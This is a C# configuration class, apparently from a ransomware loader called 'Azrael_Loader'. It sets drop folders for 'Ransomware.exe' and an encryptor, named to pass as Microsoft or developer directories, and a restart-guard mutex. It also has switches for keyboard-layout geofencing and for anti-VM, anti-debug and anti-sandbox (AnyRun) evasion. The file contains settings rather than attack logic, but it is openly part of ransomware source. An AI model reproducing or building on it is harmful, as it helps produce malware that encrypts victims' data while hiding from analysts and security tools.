namespace Azrael_Loader
{
    internal class config
    {
        public static string MainFolder = @"C:\ProgramData\MicrosoftDevDiv"; // Folder to dorp Ransomware.exe
        public static string encFolder = @"C:\ProgramData\DeveloperSoftware"; // Folder to drop encryptor.exe
        public static string MutexValue = "azrael@tests"; // Mutex-Value to protect against restart

        public static bool MutexControl = false; // Option to use Mutex-Control
        public static bool AntiCIS = false; // Option to use Anti-CIS (This is a startup blocker on computers with certain keyboard layouts.)
        public static bool AntiVM = false;
        public static bool AntiDebug = false; // Anti Debug functions
        public static bool AntiAnyRun = false; // AntiAnyrun functions

    }
}
